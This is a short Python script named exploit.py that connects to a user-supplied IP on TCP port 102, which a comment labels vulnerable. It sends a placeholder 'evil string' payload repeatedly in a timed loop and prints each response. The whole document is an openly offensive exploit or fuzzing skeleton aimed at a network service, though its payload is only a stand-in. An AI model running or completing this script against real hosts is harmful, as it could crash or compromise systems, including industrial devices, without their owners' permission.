import socket 
import sys
from time import sleep 
if len(sys.argv) != 2: 
    print("Usage: exploit.py <ip>")
    sys.exit(0) 
for x in range(1,50): 
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#vulnerable TCP port 102 
    connect=s.connect((str(sys.argv[1]), 102))
    s.send('some evil string \r\n\n') 
    print("bufff " + str(x) + " sent...\n")
    result=s.recv(1024) 
    print(result)
    s.close() 
    sleep(7)
            